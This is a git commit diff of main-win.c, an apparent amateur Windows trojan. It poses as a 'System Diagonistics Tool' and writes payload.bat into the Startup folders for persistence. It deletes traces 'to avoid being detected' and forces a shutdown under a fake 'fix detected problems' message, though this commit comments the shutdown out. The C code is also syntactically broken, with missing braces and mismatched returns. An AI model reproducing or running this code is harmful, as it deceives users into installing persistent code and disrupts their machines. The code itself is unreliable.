17c614aa74058d2d3ba0df53047df2164aedffbc
Caleb W <51061101+calebrwalk5@users.noreply.github.com>
2021-03-19 13:32:50 -0400

    Add files via upload

--- main-win.c
+++ main-win.c
@@ -12,27 +12,28 @@ void tunnel() {
 // put file in startup folder
 void tscan() {
     FILE *f,*fp;
-    char s[800],ch; int i=0;
+    char s[800],ch;
+	int i = 0;
     f=fopen("user","r");
     if(f==NULL) {
         exit(0);
     }
-    while(feof(f)==0) 
+    while(feof(f)==0)
         fscanf(f,"%c",&ch);
-        if(ch=='\n')
-            break;
+        if(ch=='\n') {
+            return 0;
+        }
         s[i]=ch;
         i++;
     }
-    s[i]='\0';
     fclose(f);
-    strcat(s,"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.bat");
+    system("echo. > 'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.bat'");
     fp=fopen(s,"w");
-	
+
 	// see if you need admin
-    if(fp==NULL) 
+    if(fp==NULL)
         f=fopen("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.bat","w");
-        if(f==NULL) 
+        if(f==NULL)
             system("cls");
             remove("user");
             printf("\nPlease Run this Program as ADMINISTRATOR to continue...\n");
@@ -41,7 +42,7 @@ void tscan() {
         }
         fprintf(f,"\necho off\necho Your Computer has been Hacked!\npause");
         fclose(f);
-        system("shutdown /f /t 005 /s /c \"We have to restart the PC to fix detected problems.\"");
+        //system("shutdown /f /t 005 /s /c \"We have to restart the PC to fix detected problems.\"");
         exit(0);
     }
     fprintf(fp,"\necho off\necho Your Computer Has Been Hacked!\npause");
@@ -49,22 +50,22 @@ void tscan() {
 }
 
 // clean up to avoid being detected
-void ok() 
+void ok()
     remove("user");
 }
 
 // run functions
-void run() 
+void run()
     tunnel();
     tscan();
 }
 
-void pause() 
+void pause()
     printf("\n");
     system("pause");
 }
 
-int main()    
+int main()
     // social engineering :)
     system("title System Diagonistics Tool ");
     run();
@@ -72,8 +73,8 @@ int main()
     printf("\n|----- System Diagonists -----|\n");
     printf("\n Checking PC for problems...\n");
     system("systeminfo");
-	
+
 	// shut the pc down so payload runs when the pc starts up
-    system("shutdown /f /t 005 /s /c \"We have to shutdown the PC to fix detected problems.\"");
+    //system("shutdown /f /t 005 /s /c \"We have to shutdown the PC to fix detected problems.\"");
     pause();
 }
